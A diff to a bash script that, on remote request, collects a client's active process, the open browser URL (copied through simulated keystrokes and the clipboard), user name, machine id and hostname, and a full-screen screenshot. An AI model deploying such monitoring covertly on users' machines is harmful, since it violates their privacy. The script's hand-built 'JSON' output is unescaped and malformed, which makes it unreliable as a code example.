@@ -8,7 +8,7 @@
 ## on local server when needed call remotely and retreive data
 
 # get information about current client work
-# result on successfull execution: json {current_active_url, currently_logged_in_user, user_full_name, machine_id, hostname, screenshot_full_path}
+# result on successfull execution: json {active_process_name, active_process_additional_data, currently_logged_in_user, user_full_name, machine_id, hostname, screenshot_full_path}
 
 # requirements: xdotool, xclip, imagemagick
 
@@ -40,18 +40,18 @@ export XAUTHORITY=/home/$currently_logged_in_user/.Xauthority
 
 active_window_id=$(xdotool getactivewindow)
 active_window_pid=$(xdotool getwindowpid "$active_window_id")
-process_name=$(ps -p $active_window_pid -o comm=)
+active_process_name=$(ps -p $active_window_pid -o comm=)
 
-current_active_url="BROWSER NOT ACTIVE: $process_name";
-if [ "$process_name" = "chrome" ] || [ "$process_name" = "firefox" ]
+active_process_additional_data="";
+if [ "$active_process_name" = "chrome" ] || [ "$active_process_name" = "firefox" ]
 then
 	xdotool windowactivate --sync $active_window_id key "ctrl+l"
 	xdotool windowactivate --sync $active_window_id key "ctrl+c"
 	xdotool windowactivate --sync $active_window_id key "shift+F6"
-	current_active_url=$(xclip -o)
+	active_process_additional_data=$(xclip -o)
 fi
 
-user_full_name=$(getent passwd $currently_logged_in_user | cut -d ':' -f 5)
+user_full_name=$(getent passwd $currently_logged_in_user | cut -d ':' -f 5 | cut -d ',' -f 1)
 
 # hwid is microsoft specific
 # machine id depends on dbus
@@ -64,9 +64,8 @@ current_path=$(pwd)
 screenshot_full_path="$current_path/screenshot_$screenshot_current_datetime.png"
 import -window root $screenshot_full_path
 
-echo "{'status':'success', 'current_active_url':'$current_active_url', 'currently_logged_in_user':'$currently_logged_in_user', 'user_full_name':'$user_full_name', 'machine_id':'$machine_id', 'hostname':'$hostname', 'screenshot_full_path':'$screenshot_full_path'}";
+echo "{'status':'success', 'active_process_name':'$active_process_name', 'active_process_additional_data':'$active_process_additional_data', 'currently_logged_in_user':'$currently_logged_in_user', 'user_full_name':'$user_full_name', 'machine_id':'$machine_id', 'hostname':'$hostname', 'screenshot_full_path':'$screenshot_full_path'}";
 
 # COMMENT OUT
 # to notify on complete while working in browser
 #notify-send 'done' 'done'
-
